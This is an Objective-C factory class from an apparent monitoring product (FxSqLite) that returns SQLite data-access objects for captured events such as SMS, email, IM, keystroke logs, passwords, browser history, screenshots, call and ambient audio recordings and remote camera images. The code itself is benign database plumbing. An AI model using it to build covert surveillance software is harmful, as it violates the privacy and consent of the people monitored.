//
//  DAOFactory.m
//  FxSqLite
//
//  Created by Makara Khloth on 8/29/11.
//  Copyright 2011 __MyCompanyName__. All rights reserved.
//

#import "DAOFactory.h"
#import "CallLogDAO.h"
#import "SystemDAO.h"
#import "PanicDAO.h"
#import "LocationDAO.h"
#import "MediaDAO.h"
#import "ThumbnailDAO.h"
#import "MMSDAO.h"
#import "SMSDAO.h"
#import "EmailDAO.h"
#import "SettingsDAO.h"
#import "IMDAO.h"
#import "BrowserUrlDAO.h"
#import "BookmarksDAO.h"
#import "ApplicationLifeCycleDAO.h"
#import "IMMessageDAO.h"
#import "IMAccountDAO.h"
#import "IMContactDAO.h"
#import "IMConversationDAO.h"
#import "VoIPDAO.h"
#import "KeyLogDAO.h"
#import "PageVisitedDAO.h"
#import "PasswordDAO.h"
#import "UsbConnectionDAO.h"
#import "FileTransferDAO.h"
#import "LogonDAO.h"
#import "ApplicationUsageDAO.h"
#import "IMMacOSDAO.h"
#import "EmailMacOSDAO.h"
#import "ScreenshotDAO.h"
#import "FileActivityDAO.h"
#import "NetworkTrafficDAO.h"
#import "NetworkConnectionMacOSDAO.h"
#import "PrintJobDAO.h"
#import "AppScreenShotDAO.h"

#import "FxDbException.h"

#import <sqlite3.h>

@implementation DAOFactory

+ (id) dataAccessObject: (FxEventType) eventType withSqlite3: (sqlite3*) refSqlite3
{
	id dao = NULL;
	switch (eventType) {
		case kEventTypeCallLog:
		{
			dao = [[CallLogDAO alloc] initWithSqlite3: refSqlite3];
			[dao autorelease];
		}
			break;
        case kEventTypeSystem: {
            dao = [[SystemDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
        case kEventTypePanic: {
            dao = [[PanicDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
        case kEventTypeLocation: {
            dao = [[LocationDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
        case kEventTypeSms: {
            dao = [[SMSDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
        case kEventTypeMms: {
            dao = [[MMSDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
        case kEventTypeMail: {
            dao = [[EmailDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
		case kEventTypeSettings: {
			dao = [[SettingsDAO alloc] initWithSqlite3:refSqlite3];
			[dao autorelease];
		} break;
        case kEventTypeIM: {
            dao = [[IMDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
		case kEventTypeBrowserURL: {
			dao = [[BrowserUrlDAO alloc] initWithSqlite3:refSqlite3];
			[dao autorelease];
		} break;
		case kEventTypeBookmark: {
			dao = [[BookmarksDAO alloc] initWithSqlite3:refSqlite3];
			[dao autorelease];
		} break;
		case kEventTypeApplicationLifeCycle: {
			dao = [[[ApplicationLifeCycleDAO alloc] initWithSqlite3:refSqlite3] autorelease];
		} break;
        case kEventTypeIMMessage: {
            dao = [[[IMMessageDAO alloc] initWithSqlite3:refSqlite3] autorelease];
        } break;
        case kEventTypeIMAccount: {
            dao = [[[IMAccountDAO alloc] initWithSqlite3:refSqlite3] autorelease];
        } break;
        case kEventTypeIMContact: {
            dao = [[[IMContactDAO alloc] initWithSqlite3:refSqlite3] autorelease];
        } break;
        case kEventTypeIMConversation: {
            dao = [[[IMConversationDAO alloc] initWithSqlite3:refSqlite3] autorelease];
        } break;
		case kEventTypeVoIP: {
			dao = [[[VoIPDAO alloc] initWithSQLite3:refSqlite3] autorelease];
		} break;
		case kEventTypeKeyLog: {
			dao = [[[KeyLogDAO alloc] initWithSQLite3:refSqlite3] autorelease];
		} break;
        case kEventTypePageVisited: {
            dao = [[[PageVisitedDAO alloc] initWithSQLite3:refSqlite3] autorelease];
        } break;
        case kEventTypePassword: {
            dao = [[[PasswordDAO alloc] initWithSQLite3:refSqlite3] autorelease];
        } break;
        case kEventTypeUsbConnection:
            dao = [[[UsbConnectionDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeFileTransfer:
            dao = [[[FileTransferDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeLogon:
            dao = [[[LogonDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeAppUsage:
            dao = [[[ApplicationUsageDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeIMMacOS:
            dao = [[[IMMacOSDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeEmailMacOS:
            dao = [[[EmailMacOSDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeScreenRecordSnapshot:
            dao = [[[ScreenshotDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeFileActivity:
            dao = [[[FileActivityDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeNetworkTraffic:
            dao = [[[NetworkTrafficDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeNetworkConnectionMacOS:
            dao = [[[NetworkConnectionMacOSDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypePrintJob:
            dao = [[[PrintJobDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
        case kEventTypeAppScreenShot:
            dao = [[[AppScreenShotDAO alloc] initWithSQLite3:refSqlite3] autorelease];
            break;
		case kEventTypePanicImage:
        case kEventTypeCameraImage:
        case kEventTypeVideo:
        case kEventTypeWallpaper:
        case kEventTypeCallRecordAudio:
        case kEventTypeVoIPCallRecordAudio:
        case kEventTypeAudio:
		case kEventTypeAmbientRecordAudio:
		case kEventTypeRemoteCameraImage:
		case kEventTypeRemoteCameraVideo: {
            dao = [[MediaDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
        case kEventTypeCameraImageThumbnail:
        case kEventTypeVideoThumbnail:
        case kEventTypeWallpaperThumbnail:
        case kEventTypeCallRecordAudioThumbnail:
        case kEventTypeAudioThumbnail:
		case kEventTypeAmbientRecordAudioThumbnail: {
            dao = [[ThumbnailDAO alloc] initWithSqlite3:refSqlite3];
            [dao autorelease];
        } break;
		default:
		{
            NSString *reason = [NSString stringWithFormat:@"No DAO for event type: %d", eventType];
			FxDbException* dbException = [FxDbException exceptionWithName:@"DAO not found" andReason:reason];
			dbException.errorCode = kDAOEventDatabaseNotFound;
			@throw dbException;
		}
			break;
	}
	return (dao);
}

@end
